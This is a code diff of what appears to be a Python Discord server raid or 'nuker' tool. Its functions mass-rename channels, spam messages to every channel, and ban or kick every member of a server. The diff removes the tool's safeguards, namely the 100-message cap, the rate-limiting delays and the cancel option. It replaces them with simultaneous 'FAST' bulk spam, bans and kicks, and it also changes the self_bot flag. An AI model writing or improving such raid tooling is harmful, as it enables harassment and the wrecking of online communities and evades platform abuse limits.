+    printc(f"[+] Renamed {len(chs)} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -540,28 +445,13 @@ async def handle_send_all(g):
     if not count.isdigit():
         return
     count = int(count)
-    if count > 100:
-        printc("[!] Max 100 messages per channel")
-        count = 100
-    task = asyncio.create_task(wait_cancel())
+    printc(f"[+] Sending {count} messages to {len(chs)} channels FAST...")
     tasks = []
-    total = 0
-    cancelled = False
     for ch in chs:
         for _ in range(count):
-            if check_cancel():
-                cancelled = True
-                break
             tasks.append(send_msg(ch, msg))
-            total += 1
-            await asyncio.sleep(0.05)
-        if cancelled:
-            break
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else f"[+] Sent {total} messages")
+    await asyncio.gather(*tasks, return_exceptions=True)
+    printc(f"[+] Sent {len(tasks)} messages!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -575,21 +465,9 @@ async def handle_ban_all(g):
         printc("[+] No members to ban")
         inp("Press Enter...")
         return
-    printc(f"[+] Banning {len(members)} members...")
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    for m in members:
-        if check_cancel():
-            cancelled = True
-            break
-        tasks.append(ban_member(m))
-        await asyncio.sleep(0.02)
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else f"[+] Banned {len(members)} members")
+    printc(f"[+] Banning {len(members)} members FAST...")
+    await asyncio.gather(*[ban_member(m) for m in members], return_exceptions=True)
+    printc(f"[+] Banned {len(members)} members!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -603,21 +481,9 @@ async def handle_kick_all(g):
         printc("[+] No members to kick")
         inp("Press Enter...")
         return
-    printc(f"[+] Kicking {len(members)} members...")
-    task = asyncio.create_task(wait_cancel())
-    tasks = []
-    cancelled = False
-    for m in members:
-        if check_cancel():
-            cancelled = True
-            break
-        tasks.append(kick_member(m))
-        await asyncio.sleep(0.02)
-    if tasks:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    task.cancel()
-    reset_cancel()
-    printc("[!] Cancelled" if cancelled else f"[+] Kicked {len(members)} members")
+    printc(f"[+] Kicking {len(members)} members FAST...")
+    await asyncio.gather(*[kick_member(m) for m in members], return_exceptions=True)
+    printc(f"[+] Kicked {len(members)} members!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -716,7 +582,7 @@ async def start():
                     printc(f"[X] Connection failed: {e}")
                     continue
             else:
-                bot = commands.Bot(command_prefix="!", intents=intents, self_bot=True)
+                bot = commands.Bot(command_prefix="!", intents=intents)
                 @bot.event
                 async def on_ready():
                     print_logo()
